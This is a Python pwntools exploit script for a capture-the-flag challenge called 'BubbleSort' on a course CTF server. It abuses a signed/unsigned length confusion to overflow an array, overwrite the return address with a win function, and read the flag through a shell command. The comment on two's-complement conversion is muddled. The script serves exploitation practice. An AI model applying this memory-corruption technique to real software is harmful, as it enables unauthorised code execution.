#!/usr/bin/env python
from pwn import *

#m = process('./BubbleSort')
host, port = 'csie.ctf.tw', 10121
m = remote(host,port)
# . The bubblesort itself can work with no problem
# . The problem is at the argument of Bubblesort()
# . we can just give it a signed number and bypass the Array
# . Also pay attention to the type of length in Bubblesort()
# . It's unsigned!!  Therefore, our signed num ---->  Bubblesort(unsigned num)
# . After changing to the unsigned number, func() will help us bubble with the num out of array[]
# . Then we can successfully change the return address to darksoul >_<

darksoul = 134514048
m.recvuntil('length :')
m.send('127\n')

m.recvuntil('Array:')
m.sendline('134514048 '*127)

# . Here, it's embarassing that I forget conversion between signed and unsigned
# . So, I will take a review again
# . Showing num with binary base, the MSB not work as number when it's signed int
# . conversion : revert all the number and add 1 to the MSB
# . e.g. -125 ----> 130
# . -125 = 1 1111101    -> revert ->   0 0000010   -> add 1 ->   1 0000010  (unsigned so,2^8 + 2 = 130
m.recvuntil('sort ? :')
m.send('-125\n')

sleep(1)
m.sendline('cat /home/`whoami`/flag')
m.interactive()
